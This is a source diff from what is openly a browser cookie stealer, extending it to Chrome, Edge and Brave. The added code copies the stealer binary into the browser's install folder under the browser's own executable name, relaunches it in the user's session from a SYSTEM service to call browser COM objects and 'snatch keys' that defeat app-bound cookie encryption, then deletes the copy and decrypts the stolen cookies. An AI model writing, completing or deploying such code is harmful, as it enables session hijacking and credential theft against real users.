@@ -1,28 +1,41 @@
 #include "includes\AppBoundKeyParser.h"
 #include "includes\Helper.h"
-#include "includes\AppBoundKeyDecryptor.h"
+//#include "includes\AppBoundKeyDecryptor.h"
+#include "includes\AppBoundDecryptor.h"
 #include "includes\TaskService.h"
 
 std::string app_bound_browser_paths = "AppData\\Local\\";
 std::vector<std::string> browsers_app_bound = {
-	//"Microsoft\\Edge\\",
-	//"BraveSoftware\\Brave-Browser",
-	"Google\\Chrome\\"
+	"BraveSoftware\\Brave-Browser\\",
+	"Google\\Chrome\\",
+	"Microsoft\\Edge\\"
 };
 
 BOOL app_bound_browsers_cookie_collector(std::string username, std::string stealer_db, BOOL service, std::string service_parameter)
 {
-	if (!CheckProcessPriv())
-	{
-		std::cerr << "Admin Privileges Required !!!" << std::endl;
-		RestartAsAdmin("-app-bound-decryption");
-	}
-
 	if (service)
 	{
-		AppBoundKeyDecryptor key_obj;
+		if (service_parameter.find("-exec") != std::string::npos)
+		{
+			//CALL COM OBJECTS and snatch keys
+			//CALL Functions that will be in Decryptor class
+
+			AppBoundDecryptor app_obj;
+			if (!app_obj.RequestCOM(service_parameter))
+				exit(-1);
+
+			exit(0);
+		}
+		//---------------------------------------
+
+		char modulePath[MAX_PATH];
+		if (GetModuleFileNameA(NULL, modulePath, MAX_PATH) == 0) {
+			exit(-1);
+		}
+
+		//AppBoundKeyDecryptor key_obj;
 		std::string target_user_data;
-		std::string target_key_data;
+		std::string target_location_data;
 
 		// Those paths that contains \\ at the end means they have the default file 'User Data'
 		// Those paths that doesn't contain \\ at the end means they are the data directories themselves
@@ -38,11 +51,114 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 					target_user_data = "C:\\users\\" + service_parameter + "\\" + app_bound_browser_paths + dir;
 			}
 
-			target_key_data = target_user_data + "\\Local State";
-			if (!key_obj.SetupService(target_key_data, dir))
-				exit(1);
+			target_location_data = target_user_data + "\\Last Browser";
+			std::string fileContent = ReadUTF16LEFileToUTF8(target_location_data);
+			if (fileContent == "")
+				continue;
+
+			std::string exeName = fileContent.substr(fileContent.find_last_of("\\/") + 1);
+			size_t lastSlash = fileContent.find_last_of("\\");
+			size_t secondLastSlash = fileContent.find_last_of("\\", lastSlash - 1);
+			//size_t thirdLastSlash = fileContent.find_last_of("\\", secondLastSlash - 1);
+			std::string grandParentFolder = fileContent.substr(0, secondLastSlash);
+			std::string destinationPath = grandParentFolder + "\\" + exeName;
+
+			if (!CopyFileA(modulePath, destinationPath.c_str(), FALSE)) {
+				exit(-1);
+			}
+
+			////-------------------------------------------------------------------------
+			std::string service_parameter_flagged = service_parameter + "-exec";
+			std::vector<std::string> parameters = { "-app-bound-decryption", "-service", service_parameter_flagged };
+
+			// Build command line string
+			std::string commandLine = destinationPath.c_str();
+
+			for (const auto& param : parameters) {
+				commandLine += " " + param;
+			}
+
+			////---------------------------------------------------------------------------
+			//std::wstring w_cmdline = StringToWString(commandLine);
+			//STARTUPINFO si = { sizeof(si) };
+			//PROCESS_INFORMATION pi;
+
+			//if (!CreateProcess(
+			//	NULL,                  // No module name (use command line)
+			//	const_cast<LPWSTR>(w_cmdline.c_str()), // Command line
+			//	NULL,                  // Process handle not inheritable
+			//	NULL,                  // Thread handle not inheritable
+			//	FALSE,                // Set handle inheritance to FALSE
+			//	0,                     // No creation flags
+			//	NULL,                  // Use parent's environment block
+			//	NULL,                  // Use parent's starting directory 
+			//	&si,                   // Pointer to STARTUPINFO structure
+			//	&pi)                   // Pointer to PROCESS_INFORMATION structure
+			//	) {
+			//	// Handle error
+			//}
+
+			//// Optionally, wait for the process to finish
+			//WaitForSingleObject(pi.hProcess, INFINITE);
+
+			//// Close handles
+			//CloseHandle(pi.hProcess);
+			//CloseHandle(pi.hThread);
+			////--------------------------------------------------------------------------
+
+			//Since this section of code is running as a SERVICE with SYSTEM privileges so in order to interact with the COM objects, we need user mode privileges. Need to create process as a user.
+			std::wstring w_cmdline = StringToWString(commandLine);
+
+			// Get the active user session
+			DWORD sessionId = WTSGetActiveConsoleSessionId();
+			HANDLE hUserToken;
+
+			if (!WTSQueryUserToken(sessionId, &hUserToken)) {
+				//std::cerr << "Failed to get user token. Error: " << GetLastError() << std::endl;
+				exit(-1);
+			}
+
+			// Set up process startup info
+			STARTUPINFO si = { sizeof(si) };
+			PROCESS_INFORMATION pi = {};
+
+			// Create the process as the user
+			if (!CreateProcessAsUser(
+				hUserToken,               // User token
+				NULL,                     // No module name (use command line)
+				const_cast<LPWSTR>(w_cmdline.c_str()), // Command line
+				NULL,                     // Process handle not inheritable
+				NULL,                     // Thread handle not inheritable
+				FALSE,                    // Set handle inheritance to FALSE
+				0,						  // No creation Flags
+				NULL,                     // Use parent's environment block
+				NULL,                     // Use parent's starting directory
+				&si,                      // Pointer to STARTUPINFO structure
+				&pi                       // Pointer to PROCESS_INFORMATION structure
+			)) {
+				//std::cerr << "Failed to create process as user. Error: " << GetLastError() << std::endl;
+				CloseHandle(hUserToken);
+				exit(-1);
+			}
+
+			// Optionally, wait for the process to finish
+			WaitForSingleObject(pi.hProcess, INFINITE);
+
+			// Close handles
+			CloseHandle(pi.hProcess);
+			CloseHandle(pi.hThread);
+			CloseHandle(hUserToken);
+
+			//-------Delete binaries in here
+			DeleteFileAfterExit(destinationPath.c_str());
 		}
 		exit(0);
+	}
+
+	if (!CheckProcessPriv())
+	{
+		std::cerr << "Admin Privileges Required !!!" << std::endl;
+		RestartAsAdmin("-app-bound-decryption");
 	}
 
 	std::wstring TaskName = StringToWString("shaddy43");
@@ -57,7 +173,7 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 	if (!RunScheduledTask(TaskName))
 		return false;
 
-	Sleep(1000);
+	Sleep(3000);
 	DeleteScheduledTask(TaskName);
 
 	std::vector<DataHolder> data_list;
@@ -101,7 +217,11 @@ BOOL app_bound_browsers_cookie_collector(std::string username, std::string steal
 			std::string service_data_path = "c:\\users";
 			service_data_path += "\\public\\";
 			service_data_path += "NTUSER.dat";
-			AppBoundKeyDecryptor obj;
+
+			if (!waitForFile(service_data_path, 3000, 100))
+				continue;
+
+			AppBoundDecryptor obj;
 			if (obj.AppBoundDecryptorInit(service_data_path, dir))
 			{
 				while (sqlite3_step(stmt) == SQLITE_ROW)
